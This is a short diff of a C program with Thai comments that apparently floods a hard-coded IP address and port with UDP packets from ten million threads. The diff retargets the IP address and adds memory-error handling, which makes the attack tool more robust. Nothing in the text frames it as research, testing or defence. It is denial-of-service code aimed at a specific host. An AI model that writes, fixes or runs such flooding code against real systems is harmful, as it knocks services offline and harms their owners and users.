@@ -7,8 +7,8 @@
 #include <sys/socket.h>
 
 #define PACKET_SIZE 1024
-#define TARGET_PORT 10012  // เปลี่ยนพอร์ตตามต้องการ
-#define TARGET_IP "202.181.73.208"  // เปลี่ยน IP ตามต้องการ
+#define TARGET_PORT 10012  // เปลี่ยนพอร์ตเป็น 10012
+#define TARGET_IP "202.181.72.70"  // เปลี่ยน IP เป็น 202.181.72.70
 #define NUM_THREADS 10000000  // จำนวนเธรดทั้งหมด
 #define PACKETS_PER_THREAD 1  // จำนวนแพ็กเก็ตที่แต่ละเธรดจะส่ง
 
@@ -61,11 +61,16 @@ int main() {
     // สร้างเธรดทั้งหมด
     for (int i = 0; i < NUM_THREADS; i++) {
         thread_data_t *data = (thread_data_t *)malloc(sizeof(thread_data_t));
+        if (data == NULL) {
+            perror("malloc failed");
+            exit(1);
+        }
         data->sockfd = sockfd;
         data->target_addr = target_addr;
 
         if (pthread_create(&threads[i], NULL, send_udp_packet, (void *)data) != 0) {
             perror("Thread creation failed");
+            free(data);  // ปล่อยหน่วยความจำก่อนออกจากโปรแกรม
             exit(1);
         }
     }
